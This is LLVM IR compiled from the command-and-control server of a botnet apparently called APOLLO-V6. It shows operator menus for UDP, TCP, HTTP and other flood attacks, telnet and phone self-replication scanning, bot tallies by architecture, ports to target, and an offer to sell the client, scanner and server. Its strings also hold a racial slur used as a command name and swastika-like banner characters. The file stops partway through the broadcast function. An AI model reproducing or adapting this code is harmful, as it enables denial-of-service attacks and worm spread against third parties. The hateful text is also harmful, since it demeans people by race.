; ModuleID = 'server.c'
source_filename = "server.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-pc-linux-gnu"

%struct.clientdata_t = type { i32, i8, i8, i8, i8, i8, i8, i8, i8 }
%struct.telnetdata_t = type { i32 }
%struct._IO_FILE = type { i32, i8*, i8*, i8*, i8*, i8*, i8*, i8*, i8*, i8*, i8*, i8*, %struct._IO_marker*, %struct._IO_FILE*, i32, i32, i64, i16, i8, [1 x i8], i8*, i64, %struct._IO_codecvt*, %struct._IO_wide_data*, %struct._IO_FILE*, i8*, i64, i32, [20 x i8] }
%struct._IO_marker = type opaque
%struct._IO_codecvt = type opaque
%struct._IO_wide_data = type opaque
%struct.login_info = type { [20 x i8], [20 x i8] }
%struct.tm = type { i32, i32, i32, i32, i32, i32, i32, i32, i32, i64, i8* }
%struct.epoll_event = type <{ i32, %union.epoll_data }>
%union.epoll_data = type { i8* }
%struct.sockaddr = type { i16, [14 x i8] }
%struct.sockaddr_in = type { i16, i16, %struct.in_addr, [8 x i8] }
%struct.in_addr = type { i32 }
%struct.stat = type { i64, i64, i64, i32, i32, i32, i32, i64, i64, i64, i64, %struct.timespec, %struct.timespec, %struct.timespec, [3 x i64] }
%struct.timespec = type { i64, i64 }
%union.pthread_attr_t = type { i64, [48 x i8] }
%struct.addrinfo = type { i32, i32, i32, i32, i32, %struct.sockaddr*, i8*, %struct.addrinfo* }

@.str = private unnamed_addr constant [5 x i8] c"PING\00", align 1
@clients = dso_local global [1000000 x %struct.clientdata_t] zeroinitializer, align 16
@managements = dso_local global [1000000 x %struct.telnetdata_t] zeroinitializer, align 16
@.str.1 = private unnamed_addr constant [8 x i8] c"\1B[1;35m\00", align 1
@.str.2 = private unnamed_addr constant [3 x i8] c": \00", align 1
@.str.3 = private unnamed_addr constant [2 x i8] c"\0A\00", align 1
@epollFD = internal global i32 0, align 4
@listenFD = internal global i32 0, align 4
@.str.4 = private unnamed_addr constant [7 x i8] c"accept\00", align 1
@dups = internal global i32 0, align 4
@.str.5 = private unnamed_addr constant [11 x i8] c"!* KILLME\0A\00", align 1
@.str.6 = private unnamed_addr constant [10 x i8] c"epoll_ctl\00", align 1
@.str.7 = private unnamed_addr constant [15 x i8] c"!* NIGGERKILL\0A\00", align 1
@.str.8 = private unnamed_addr constant [15 x i8] c"!* TELSCAN ON\0A\00", align 1
@.str.9 = private unnamed_addr constant [6 x i8] c"PONG\0A\00", align 1
@.str.10 = private unnamed_addr constant [5 x i8] c"MIPS\00", align 1
@.str.11 = private unnamed_addr constant [7 x i8] c"MIPSEL\00", align 1
@.str.12 = private unnamed_addr constant [4 x i8] c"SH4\00", align 1
@.str.13 = private unnamed_addr constant [7 x i8] c"x86_64\00", align 1
@.str.14 = private unnamed_addr constant [5 x i8] c"i586\00", align 1
@.str.15 = private unnamed_addr constant [5 x i8] c"i686\00", align 1
@.str.16 = private unnamed_addr constant [4 x i8] c"PPC\00", align 1
@.str.17 = private unnamed_addr constant [5 x i8] c"m68k\00", align 1
@.str.18 = private unnamed_addr constant [6 x i8] c"sparc\00", align 1
@.str.19 = private unnamed_addr constant [6 x i8] c"ARMv4\00", align 1
@.str.20 = private unnamed_addr constant [6 x i8] c"ARMv5\00", align 1
@.str.21 = private unnamed_addr constant [6 x i8] c"ARMv6\00", align 1
@.str.22 = private unnamed_addr constant [8 x i8] c"TELNET \00", align 1
@telFD = internal global %struct._IO_FILE* null, align 8
@.str.23 = private unnamed_addr constant [4 x i8] c"%s\0A\00", align 1
@TELFound = internal global i32 0, align 4
@.str.24 = private unnamed_addr constant [5 x i8] c"PONG\00", align 1
@.str.25 = private unnamed_addr constant [11 x i8] c"buf: \22%s\22\0A\00", align 1
@.str.26 = private unnamed_addr constant [43 x i8] c"%c]0; [+] Bots: %d [-] Operators: %d [+]%c\00", align 1
@OperatorsConnected = internal global i32 0, align 4
@.str.27 = private unnamed_addr constant [9 x i8] c"MODZ.txt\00", align 1
@.str.28 = private unnamed_addr constant [2 x i8] c"r\00", align 1
@.str.29 = private unnamed_addr constant [13 x i8] c"%d.%d.%d.%d\0A\00", align 1
@.str.30 = private unnamed_addr constant [16 x i8] c"Connections.log\00", align 1
@.str.31 = private unnamed_addr constant [2 x i8] c"a\00", align 1
@.str.32 = private unnamed_addr constant [17 x i8] c"\0AIP:%d.%d.%d.%d \00", align 1
@.str.33 = private unnamed_addr constant [6 x i8] c"%s %s\00", align 1
@accounts = internal global [22 x %struct.login_info] zeroinitializer, align 16
@.str.34 = private unnamed_addr constant [17 x i8] c"\1B[35mName:\1B[33m \00", align 1
@.str.35 = private unnamed_addr constant [3 x i8] c"%s\00", align 1
@.str.36 = private unnamed_addr constant [21 x i8] c"\1B[35mPasscode:\1B[30m \00", align 1
@.str.37 = private unnamed_addr constant [5 x i8] c"\1B[1A\00", align 1
@.str.38 = private unnamed_addr constant [45 x i8] c"\1B[0;37m***********************************\0D\0A\00", align 1
@.str.39 = private unnamed_addr constant [45 x i8] c"\1B[0;37m*  Incorrect Credentials!         *\0D\0A\00", align 1
@.str.40 = private unnamed_addr constant [45 x i8] c"\1B[0;37m*    This has been logged         *\0D\0A\00", align 1
@.str.41 = private unnamed_addr constant [33 x i8] c"\1B[0;37m[+] Loading The Net [+]\0D\0A\00", align 1
@.str.42 = private unnamed_addr constant [11 x i8] c"\1B[2J\1B[1;1H\00", align 1
@.str.43 = private unnamed_addr constant [169 x i8] c"\1B[0;31m\E2\96\88\E2\96\88\E2\96\88\1B[1;31m\E2\95\97   \1B[0;31m\E2\96\88\E2\96\88\E2\96\88\1B[1;31m\E2\95\97 \1B[0;31m\E2\96\88\E2\96\88\E2\96\88\E2\96\88\E2\96\88\E2\96\88\1B[1;31m\E2\95\97 \1B[0;31m\E2\96\88\E2\96\88\E2\96\88\E2\96\88\E2\96\88\E2\96\88\1B[1;31m\E2\95\97 \1B[0;31m\E2\96\88\E2\96\88\E2\96\88\E2\96\88\E2\96\88\E2\96\88\E2\96\88\1B[1;31m\E2\95\97\0D\0A\00", align 1
@.str.44 = private unnamed_addr constant [207 x i8] c"\1B[0;31m\E2\96\88\E2\96\88\E2\96\88\E2\96\88\1B[1;31m\E2\95\97 \1B[0;31m\E2\96\88\E2\96\88\E2\96\88\E2\96\88\1B[1;31m\E2\95\91\1B[0;31m\E2\96\88\E2\96\88\1B[1;31m\E2\95\94\E2\95\90\E2\95\90\E2\95\90\1B[0;31m\E2\96\88\E2\96\88\1B[1;31m\E2\95\97\1B[0;31m\E2\96\88\E2\96\88\1B[1;31m\E2\95\94\E2\95\90\E2\95\90\1B[0;31m\E2\96\88\E2\96\88\1B[1;31m\E2\95\97\E2\95\9A\E2\95\90\E2\95\90\1B[0;31m\E2\96\88\E2\96\88\E2\96\88\1B[1;31m\E2\95\94\E2\95\9D\0D\0A\00", align 1
@.str.45 = private unnamed_addr constant [207 x i8] c"\1B[0;31m\E2\96\88\E2\96\88\1B[1;31m\E2\95\94\1B[0;31m\E2\96\88\E2\96\88\E2\96\88\E2\96\88\1B[1;31m\E2\95\94\1B[0;31m\E2\96\88\E2\96\88\1B[1;31m\E2\95\91\1B[0;31m\E2\96\88\E2\96\88\1B[1;31m\E2\95\91   \1B[0;31m\E2\96\88\E2\96\88\1B[1;31m\E2\95\91\1B[0;31m\E2\96\88\E2\96\88\1B[1;31m\E2\95\91  \1B[0;31m\E2\96\88\E2\96\88\1B[1;31m\E2\95\91  \1B[0;31m\E2\96\88\E2\96\88\E2\96\88\1B[1;31m\E2\95\94\E2\95\9D \0D\0A\00", align 1
@.str.46 = private unnamed_addr constant [207 x i8] c"\1B[0;31m\E2\96\88\E2\96\88\1B[1;31m\E2\95\91\E2\95\9A\1B[0;31m\E2\96\88\E2\96\88\1B[1;31m\E2\95\94\E2\95\9D\1B[0;31m\E2\96\88\E2\96\88\1B[1;31m\E2\95\91\1B[0;31m\E2\96\88\E2\96\88\1B[1;31m\E2\95\91   \1B[0;31m\E2\96\88\E2\96\88\1B[1;31m\E2\95\91\1B[0;31m\E2\96\88\E2\96\88\1B[1;31m\E2\95\91  \1B[0;31m\E2\96\88\E2\96\88\1B[1;31m\E2\95\91 \1B[0;31m\E2\96\88\E2\96\88\E2\96\88\1B[1;31m\E2\95\94\E2\95\9D  \0D\0A\00", align 1
@.str.47 = private unnamed_addr constant [177 x i8] c"\1B[0;31m\E2\96\88\E2\96\88\1B[1;31m\E2\95\91 \E2\95\9A\E2\95\90\E2\95\9D \1B[0;31m\E2\96\88\E2\96\88\1B[1;31m\E2\95\91\E2\95\9A\1B[0;31m\E2\96\88\E2\96\88\E2\96\88\E2\96\88\E2\96\88\E2\96\88\1B[1;31m\E2\95\94\E2\95\9D\1B[0;31m\E2\96\88\E2\96\88\E2\96\88\E2\96\88\E2\96\88\E2\96\88\1B[1;31m\E2\95\94\E2\95\9D\1B[0;31m\E2\96\88\E2\96\88\E2\96\88\E2\96\88\E2\96\88\E2\96\88\E2\96\88\1B[1;31m\E2\95\97\0D\0A\00", align 1
@.str.48 = private unnamed_addr constant [102 x i8] c"\1B[1;31m\E2\95\9A\E2\95\90\E2\95\9D     \E2\95\9A\E2\95\90\E2\95\9D \E2\95\9A\E2\95\90\E2\95\90\E2\95\90\E2\95\90\E2\95\90\E2\95\9D \E2\95\9A\E2\95\90\E2\95\90\E2\95\90\E2\95\90\E2\95\90\E2\95\9D \E2\95\9A\E2\95\90\E2\95\90\E2\95\90\E2\95\90\E2\95\90\E2\95\90\E2\95\9D\0D\0A\00", align 1
@.str.49 = private unnamed_addr constant [70 x i8] c"\1B[0;36m\E5\8D\90\E5\8D\90\E5\8D\90\E5\8D\90\E5\8D\90\E5\8D\90\E5\8D\90\E5\8D\90\E5\8D\90\E5\8D\90\E5\8D\90\E5\8D\90\E5\8D\90\E5\8D\90\E5\8D\90\E5\8D\90\E5\8D\90\E5\8D\90\E5\8D\90\E5\8D\90\0D\0A\00", align 1
@.str.50 = private unnamed_addr constant [61 x i8] c"\0D\0A  \1B[0m[!]\1B[0;31m Welcome \1B[0;35m %s\1B[0;31m To HELL \1B[0m[!]\00", align 1
@.str.51 = private unnamed_addr constant [59 x i8] c"\0D\0A  \1B[0m[!]\1B[0;31m Type HELP to see commands \1B[0m[!]\1B[0m\0D\0A\00", align 1
@.str.52 = private unnamed_addr constant [74 x i8] c"\0D\0A\1B[0;36m\E5\8D\90\E5\8D\90\E5\8D\90\E5\8D\90\E5\8D\90\E5\8D\90\E5\8D\90\E5\8D\90\E5\8D\90\E5\8D\90\E5\8D\90\E5\8D\90\E5\8D\90\E5\8D\90\E5\8D\90\E5\8D\90\E5\8D\90\E5\8D\90\E5\8D\90\E5\8D\90\0D\0A\0D\0A\00", align 1
@.str.53 = private unnamed_addr constant [16 x i8] c"\1B[1;31m~> \1B[36m\00", align 1
@.str.54 = private unnamed_addr constant [9 x i8] c"BOTCOUNT\00", align 1
@.str.55 = private unnamed_addr constant [13 x i8] c" MIPS [%d]\0D\0A\00", align 1
@.str.56 = private unnamed_addr constant [12 x i8] c" x86 [%d]\0D\0A\00", align 1
@.str.57 = private unnamed_addr constant [12 x i8] c" PPC [%d]\0D\0A\00", align 1
@.str.58 = private unnamed_addr constant [13 x i8] c" M68K [%d]\0D\0A\00", align 1
@.str.59 = private unnamed_addr constant [12 x i8] c" SPC [%d]\0D\0A\00", align 1
@.str.60 = private unnamed_addr constant [12 x i8] c" ARM [%d]\0D\0A\00", align 1
@.str.61 = private unnamed_addr constant [12 x i8] c" SH4 [%d]\0D\0A\00", align 1
@.str.62 = private unnamed_addr constant [5 x i8] c"BOTS\00", align 1
@.str.63 = private unnamed_addr constant [13 x i8] c" Bots [%d]\0D\0A\00", align 1
@.str.64 = private unnamed_addr constant [21 x i8] c" Dups Deleted [%d]\0D\0A\00", align 1
@.str.65 = private unnamed_addr constant [22 x i8] c" Telnet logins [%d]\0D\0A\00", align 1
@.str.66 = private unnamed_addr constant [18 x i8] c" Operators [%d]\0D\0A\00", align 1
@.str.67 = private unnamed_addr constant [7 x i8] c"STATUS\00", align 1
@.str.68 = private unnamed_addr constant [5 x i8] c"bots\00", align 1
@.str.69 = private unnamed_addr constant [5 x i8] c"TIME\00", align 1
@.str.70 = private unnamed_addr constant [51 x i8] c" you go past 3600 seconds and your ass is fried \0D\0A\00", align 1
@.str.71 = private unnamed_addr constant [6 x i8] c"RULES\00", align 1
@.str.72 = private unnamed_addr constant [163 x i8] c" Please Read The Following Rules if not will result in ban\0D\0A 1.) DO NOT SHARE YOUR ACCOUNT INFO \0D\0A 2.) DO NOT SPAM THE NET\0D\0A 3.) Dont hit any goverment websites\0D\0A\00", align 1
@.str.73 = private unnamed_addr constant [6 x i8] c"PORTS\00", align 1
@.str.74 = private unnamed_addr constant [63 x i8] c" Console~3074 NFO~1094/443 Hotspot~USE A TOOL FOR THEIR PORT\0D\0A\00", align 1
@.str.75 = private unnamed_addr constant [14 x i8] c"!* NIGGERKILL\00", align 1
@.str.76 = private unnamed_addr constant [25 x i8] c" Those Boatz Got Killd\0D\0A\00", align 1
@.str.77 = private unnamed_addr constant [15 x i8] c"!* TELSCAN OFF\00", align 1
@.str.78 = private unnamed_addr constant [33 x i8] c" TELNET SELF REPLIFICATION OFF\0D\0A\00", align 1
@.str.79 = private unnamed_addr constant [14 x i8] c"!* TELSCAN ON\00", align 1
@.str.80 = private unnamed_addr constant [32 x i8] c" TELNET SELF REPLIFICATION ON\0D\0A\00", align 1
@.str.81 = private unnamed_addr constant [16 x i8] c"!* PHONESCAN ON\00", align 1
@.str.82 = private unnamed_addr constant [31 x i8] c" PHONE SELF REPLIFICATION ON\0D\0A\00", align 1
@.str.83 = private unnamed_addr constant [17 x i8] c"!* PHONESCAN OFF\00", align 1
@.str.84 = private unnamed_addr constant [32 x i8] c" PHONE SELF REPLIFICATION OFF\0D\0A\00", align 1
@.str.85 = private unnamed_addr constant [7 x i8] c"!* TCP\00", align 1
@.str.86 = private unnamed_addr constant [44 x i8] c" WOOPS DADDY JUST DROPPED THAT SHIT [TCP]\0D\0A\00", align 1
@.str.87 = private unnamed_addr constant [7 x i8] c"!* UDP\00", align 1
@.str.88 = private unnamed_addr constant [44 x i8] c" WOOPS DADDY JUST DROPPED THAT SHIT [UDP]\0D\0A\00", align 1
@.str.89 = private unnamed_addr constant [7 x i8] c"!* STD\00", align 1
@.str.90 = private unnamed_addr constant [44 x i8] c" WOOPS DADDY JUST DROPPED THAT SHIT [STD]\0D\0A\00", align 1
@.str.91 = private unnamed_addr constant [7 x i8] c"!* CNC\00", align 1
@.str.92 = private unnamed_addr constant [44 x i8] c" WOOPS DADDY JUST DROPPED THAT SHIT [CNC]\0D\0A\00", align 1
@.str.93 = private unnamed_addr constant [8 x i8] c"!* HOLD\00", align 1
@.str.94 = private unnamed_addr constant [45 x i8] c" WOOPS DADDY JUST DROPPED THAT SHIT [HOLD]\0D\0A\00", align 1
@.str.95 = private unnamed_addr constant [8 x i8] c"!* JUNK\00", align 1
@.str.96 = private unnamed_addr constant [45 x i8] c" WOOPS DADDY JUST DROPPED THAT SHIT [JUNK]\0D\0A\00", align 1
@.str.97 = private unnamed_addr constant [12 x i8] c"!* STOPATTK\00", align 1
@.str.98 = private unnamed_addr constant [31 x i8] c" SUCCESSFULLY STOPPED ATTACK\0D\0A\00", align 1
@.str.99 = private unnamed_addr constant [5 x i8] c"INFO\00", align 1
@.str.100 = private unnamed_addr constant [107 x i8] c" This server side is on Version 1. \0D\0A Msg ghost.rootmodz if you want to buy the client/server/scanner/cc\0D\0A\00", align 1
@.str.101 = private unnamed_addr constant [8 x i8] c"!* HTTP\00", align 1
@.str.102 = private unnamed_addr constant [45 x i8] c" WOOPS DADDY JUST DROPPED THAT SHIT [HTTP]\0D\0A\00", align 1
@.str.103 = private unnamed_addr constant [6 x i8] c"ports\00", align 1
@.str.104 = private unnamed_addr constant [59 x i8] c" Console~3074 NFO~1094 Hotspot~USE A TOOL FOR THEIR PORT\0D\0A\00", align 1
@.str.105 = private unnamed_addr constant [5 x i8] c"HELP\00", align 1
@.str.106 = private unnamed_addr constant [25 x i8] c"\1B[0;31mType An Option:\0D\0A\00", align 1
@.str.107 = private unnamed_addr constant [66 x i8] c"\1B[1;37m[\1B[35mDDOS\1B[1;37m] ~ Shows all commands for DDoS Attacks\0D\0A\00", align 1
@.str.108 = private unnamed_addr constant [66 x i8] c"\1B[1;37m[\1B[34mEXTRA\1B[1;37m] ~ Shows a list of all extra commands\0D\0A\00", align 1
@.str.109 = private unnamed_addr constant [5 x i8] c"DDOS\00", align 1
@.str.110 = private unnamed_addr constant [64 x i8] c"\1B[31m !* UDP [IP] [PORT] [TIME] 32 1337 10 -------| UDP FLOOD\0D\0A\00", align 1
@.str.111 = private unnamed_addr constant [64 x i8] c"\1B[35m !* TCP [IP] [PORT] [TIME] 32 all 1337 10 ---| TCP FLOOD\0D\0A\00", align 1
@.str.112 = private unnamed_addr constant [63 x i8] c"\1B[31m !* HTTP [URL] G|H|P [PORT] / [TIME] 1337 ---| L7 FLOOD\0D\0A\00", align 1
@.str.113 = private unnamed_addr constant [65 x i8] c"\1B[35m !* JUNK [IP] [PORT] [TIME] -----------------| JUNK FLOOD\0D\0A\00", align 1
@.str.114 = private unnamed_addr constant [59 x i8] c"\1B[31m !* HOLD [IP] [PORT] [TIME] -----------------| HOLD\0D\0A\00", align 1
@.str.115 = private unnamed_addr constant [64 x i8] c"\1B[35m !* STD [IP] [PORT] [TIME] ------------------| STD FLOOD\0D\0A\00", align 1
@.str.116 = private unnamed_addr constant [64 x i8] c"\1B[31m !* CNC [IP] [PORT] [TIME] ------------------| CNC FLOOD\0D\0A\00", align 1
@.str.117 = private unnamed_addr constant [72 x i8] c"\1B[35m !* STOPATTK --------------------------------| STOPS ALL ATTACKS\0D\0A\00", align 1
@.str.118 = private unnamed_addr constant [6 x i8] c"EXTRA\00", align 1
@.str.119 = private unnamed_addr constant [36 x i8] c"\1B[35m PORTS---| PORTS TO HIT WITH\0D\0A\00", align 1
@.str.120 = private unnamed_addr constant [28 x i8] c"\1B[31m BOTS----| BOT COUNT\0D\0A\00", align 1
@.str.121 = private unnamed_addr constant [32 x i8] c"\1B[35m CLEAR---| CLEARS SCREEN\0D\0A\00", align 1
@.str.122 = private unnamed_addr constant [30 x i8] c"\1B[31m RULES---| SHOWS RULES\0D\0A\00", align 1
@.str.123 = private unnamed_addr constant [38 x i8] c"\1B[35m TIME----| SHOWS MAX BOOT TIME\0D\0A\00", align 1
@.str.124 = private unnamed_addr constant [57 x i8] c"\1B[31m INFO----| SHOWS INFO ABOUT THIS SERVERSusernameE\0D\0A\00", align 1
@.str.125 = private unnamed_addr constant [6 x i8] c"CLEAR\00", align 1
@.str.126 = private unnamed_addr constant [6 x i8] c"clear\00", align 1
@.str.127 = private unnamed_addr constant [7 x i8] c"LOGOUT\00", align 1
@.str.128 = private unnamed_addr constant [14 x i8] c"Peace Mr %s\0D\0A\00", align 1
@.str.129 = private unnamed_addr constant [10 x i8] c"LOLNOGTFO\00", align 1
@.str.130 = private unnamed_addr constant [28 x i8] c"ATTEMPT TO KILL BOTS BY %s\0A\00", align 1
@.str.131 = private unnamed_addr constant [9 x i8] c"KILL.log\00", align 1
@.str.132 = private unnamed_addr constant [8 x i8] c"GTFOFAG\00", align 1
@.str.133 = private unnamed_addr constant [10 x i8] c"%s: \22%s\22\0A\00", align 1
@.str.134 = private unnamed_addr constant [11 x i8] c"report.log\00", align 1
@.str.135 = private unnamed_addr constant [21 x i8] c"ERROR opening socket\00", align 1
@.str.136 = private unnamed_addr constant [17 x i8] c"ERROR on binding\00", align 1
@.str.137 = private unnamed_addr constant [29 x i8] c"New BOTNET Connection From: \00", align 1
@.str.138 = private unnamed_addr constant [16 x i8] c"IP:%d.%d.%d.%d\0A\00", align 1
@.str.139 = private unnamed_addr constant [16 x i8] c"ERROR on accept\00", align 1
@stderr = external global %struct._IO_FILE*, align 8
@.str.140 = private unnamed_addr constant [39 x i8] c"Usage: %s [port] [threads] [cnc-port]\0A\00", align 1
@.str.141 = private unnamed_addr constant [55 x i8] c"\1B[35mThe botnet has been screened you may now connect\0A\00", align 1
@.str.142 = private unnamed_addr constant [57 x i8] c"\1B[37mMake A File Named MODZ.txt with your logins retard\0A\00", align 1
@.str.143 = private unnamed_addr constant [12 x i8] c"telnets.txt\00", align 1
@.str.144 = private unnamed_addr constant [3 x i8] c"a+\00", align 1
@.str.145 = private unnamed_addr constant [7 x i8] c"listen\00", align 1
@.str.146 = private unnamed_addr constant [13 x i8] c"epoll_create\00", align 1
@.str.147 = private unnamed_addr constant [10 x i8] c"APOLLO-V6\00", align 1
@.str.148 = private unnamed_addr constant [6 x i8] c"fcntl\00", align 1
@.str.149 = private unnamed_addr constant [17 x i8] c"getaddrinfo: %s\0A\00", align 1
@.str.150 = private unnamed_addr constant [11 x i8] c"setsockopt\00", align 1
@.str.151 = private unnamed_addr constant [16 x i8] c"Could not bind\0A\00", align 1

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local i32 @fdgets(i8* %0, i32 %1, i32 %2) #0 {
  %4 = alloca i8*, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  store i8* %0, i8** %4, align 8
  store i32 %1, i32* %5, align 4
  store i32 %2, i32* %6, align 4
  store i32 0, i32* %7, align 4
  store i32 1, i32* %8, align 4
  br label %9

9:                                                ; preds = %27, %3
  %10 = load i32, i32* %8, align 4
  %11 = icmp eq i32 %10, 1
  br i1 %11, label %12, label %25

12:                                               ; preds = %9
  %13 = load i32, i32* %7, align 4
  %14 = load i32, i32* %5, align 4
  %15 = icmp slt i32 %13, %14
  br i1 %15, label %16, label %25

16:                                               ; preds = %12
  %17 = load i8*, i8** %4, align 8
  %18 = load i32, i32* %7, align 4
  %19 = sext i32 %18 to i64
  %20 = getelementptr inbounds i8, i8* %17, i64 %19
  %21 = getelementptr inbounds i8, i8* %20, i64 -1
  %22 = load i8, i8* %21, align 1
  %23 = zext i8 %22 to i32
  %24 = icmp ne i32 %23, 10
  br label %25

25:                                               ; preds = %16, %12, %9
  %26 = phi i1 [ false, %12 ], [ false, %9 ], [ %24, %16 ]
  br i1 %26, label %27, label %37

27:                                               ; preds = %25
  %28 = load i32, i32* %6, align 4
  %29 = load i8*, i8** %4, align 8
  %30 = load i32, i32* %7, align 4
  %31 = sext i32 %30 to i64
  %32 = getelementptr inbounds i8, i8* %29, i64 %31
  %33 = call i64 @read(i32 %28, i8* %32, i64 1)
  %34 = trunc i64 %33 to i32
  store i32 %34, i32* %8, align 4
  %35 = load i32, i32* %7, align 4
  %36 = add nsw i32 %35, 1
  store i32 %36, i32* %7, align 4
  br label %9, !llvm.loop !6

37:                                               ; preds = %25
  %38 = load i32, i32* %8, align 4
  ret i32 %38
}

declare i64 @read(i32, i8*, i64) #1

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local void @trim(i8* %0) #0 {
  %2 = alloca i8*, align 8
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  store i8* %0, i8** %2, align 8
  store i32 0, i32* %4, align 4
  %6 = load i8*, i8** %2, align 8
  %7 = call i64 @strlen(i8* %6) #8
  %8 = sub i64 %7, 1
  %9 = trunc i64 %8 to i32
  store i32 %9, i32* %5, align 4
  br label %10

10:                                               ; preds = %19, %1
  %11 = load i8*, i8** %2, align 8
  %12 = load i32, i32* %4, align 4
  %13 = sext i32 %12 to i64
  %14 = getelementptr inbounds i8, i8* %11, i64 %13
  %15 = load i8, i8* %14, align 1
  %16 = sext i8 %15 to i32
  %17 = call i32 @isspace(i32 %16) #8
  %18 = icmp ne i32 %17, 0
  br i1 %18, label %19, label %22

19:                                               ; preds = %10
  %20 = load i32, i32* %4, align 4
  %21 = add nsw i32 %20, 1
  store i32 %21, i32* %4, align 4
  br label %10, !llvm.loop !8

22:                                               ; preds = %10
  br label %23

23:                                               ; preds = %38, %22
  %24 = load i32, i32* %5, align 4
  %25 = load i32, i32* %4, align 4
  %26 = icmp sge i32 %24, %25
  br i1 %26, label %27, label %36

27:                                               ; preds = %23
  %28 = load i8*, i8** %2, align 8
  %29 = load i32, i32* %5, align 4
  %30 = sext i32 %29 to i64
  %31 = getelementptr inbounds i8, i8* %28, i64 %30
  %32 = load i8, i8* %31, align 1
  %33 = sext i8 %32 to i32
  %34 = call i32 @isspace(i32 %33) #8
  %35 = icmp ne i32 %34, 0
  br label %36

36:                                               ; preds = %27, %23
  %37 = phi i1 [ false, %23 ], [ %35, %27 ]
  br i1 %37, label %38, label %41

38:                                               ; preds = %36
  %39 = load i32, i32* %5, align 4
  %40 = add nsw i32 %39, -1
  store i32 %40, i32* %5, align 4
  br label %23, !llvm.loop !9

41:                                               ; preds = %36
  %42 = load i32, i32* %4, align 4
  store i32 %42, i32* %3, align 4
  br label %43

43:                                               ; preds = %59, %41
  %44 = load i32, i32* %3, align 4
  %45 = load i32, i32* %5, align 4
  %46 = icmp sle i32 %44, %45
  br i1 %46, label %47, label %62

47:                                               ; preds = %43
  %48 = load i8*, i8** %2, align 8
  %49 = load i32, i32* %3, align 4
  %50 = sext i32 %49 to i64
  %51 = getelementptr inbounds i8, i8* %48, i64 %50
  %52 = load i8, i8* %51, align 1
  %53 = load i8*, i8** %2, align 8
  %54 = load i32, i32* %3, align 4
  %55 = load i32, i32* %4, align 4
  %56 = sub nsw i32 %54, %55
  %57 = sext i32 %56 to i64
  %58 = getelementptr inbounds i8, i8* %53, i64 %57
  store i8 %52, i8* %58, align 1
  br label %59

59:                                               ; preds = %47
  %60 = load i32, i32* %3, align 4
  %61 = add nsw i32 %60, 1
  store i32 %61, i32* %3, align 4
  br label %43, !llvm.loop !10

62:                                               ; preds = %43
  %63 = load i8*, i8** %2, align 8
  %64 = load i32, i32* %3, align 4
  %65 = load i32, i32* %4, align 4
  %66 = sub nsw i32 %64, %65
  %67 = sext i32 %66 to i64
  %68 = getelementptr inbounds i8, i8* %63, i64 %67
  store i8 0, i8* %68, align 1
  ret void
}

; Function Attrs: nounwind readonly willreturn
declare i64 @strlen(i8*) #2

; Function Attrs: nounwind readonly willreturn
declare i32 @isspace(i32) #2

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local void @broadcast(i8* %0, i32 %1, i8* %2) #0 {
  %4 = alloca i8*, align 8
  %5 = alloca i32, align 4
  %6 = alloca i8*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i8*, align 8
  %9 = alloca i64, align 8
  %10 = alloca %struct.tm*, align 8
  %11 = alloca i8*, align 8
  %12 = alloca i32, align 4
  store i8* %0, i8** %4, align 8
  store i32 %1, i32* %5, align 4
  store i8* %2, i8** %6, align 8
  store i32 1, i32* %7, align 4
  %13 = load i8*, i8** %4, align 8
  %14 = call i32 @strcmp(i8* %13, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str, i64 0, i64 0)) #8
  %15 = icmp eq i32 %14, 0
  br i1 %15, label %16, label %17

16:                                               ; preds = %3
  store i32 0, i32* %7, align 4
  br label %17

17:                                               ; preds = %16, %3
  %18 = load i8*, i8** %4, align 8
  %19 = call i64 @strlen(i8* %18) #8
  %20 = add i64 %19, 10
  %21 = call noalias align 16 i8* @malloc(i64 %20) #9
  store i8* %21, i8** %8, align 8
  %22 = load i8*, i8** %8, align 8
  %23 = load i8*, i8** %4, align 8
  %24 = call i64 @strlen(i8* %23) #8
  %25 = add i64 %24, 10
  call void @llvm.memset.p0i8.i64(i8* align 1 %22, i8 0, i64 %25, i1 false)
  %26 = load i8*, i8** %8, align 8
  %27 = load i8*, i8** %4, align 8
  %28 = call i8* @strcpy(i8* %26, i8* %27) #9
  %29 = load i8*, i8** %8, align 8
  call void @trim(i8* %29)
  %30 = call i64 @time(i64* %9) #9
  %31 = call %struct.tm* @localtime(i64* %9) #9
  store %struct.tm* %31, %struct.tm** %10, align 8
  %32 = load %struct.tm*, %struct.tm** %10, align 8
  %33 = call i8* @asctime(%struct.tm* %32) #9
  store i8* %33, i8** %11, align 8
  %34 = load i8*, i8** %11, align 8
  call void @trim(i8* %34)
  store i32 0, i32* %12, align 4
  br label %35

35:                                               ; preds = %78, %17
  %36 = load i32, i32* %12, align 4
  %37 = icmp slt i32 %36, 1000000
  br i1 %37, label %38, label %81

38:                                               ; preds = %35
  %39 = load i32, i32* %12, align 4
  %40 = load i32, i32* %5, align 4
  %41 = icmp eq i32 %39, %40
  br i1 %41, label %49, label %42

42:                                               ; preds = %38
  %43 = load i32, i32* %12, align 4
  %44 = sext i32 %43 to i64
  %45 = getelementptr inbounds [1000000 x %struct.clientdata_t], [1000000 x %struct.clientdata_t]* @clients, i64 0, i64 %44
  %46 = getelementptr inbounds %struct.clientdata_t, %struct.clientdata_t* %45, i32 0, i32 1
  %47 = load i8, i8* %46, align 4
  %48 = icmp ne i8 %47, 0
  br i1 %48, label %50, label %49

49:                                               ; preds = %42, %38
  br label %78

50:                                               ; preds = %42
  %51 = load i32, i32* %7, align 4
  %52 = icmp ne i32 %51, 0
  br i1 %52, label %53, label %70

53:                                               ; preds = %50
  %54 = load i32, i32* %12, align 4
  %55 = sext i32 %54 to i64
  %56 = getelementptr inbounds [1000000 x %struct.telnetdata_t], [1000000 x %struct.telnetdata_t]* @managements, i64 0, i64 %55
  %57 = getelementptr inbounds %struct.telnetdata_t, %struct.telnetdata_t* %56, i32 0, i32 0
  %58 = load i32, i32* %57, align 4
  %59 = icmp ne i32 %58, 0
  br i1 %59, label %60, label %70

60:                                               ; preds = %53
  %61 = load i32, i32* %12, align 4
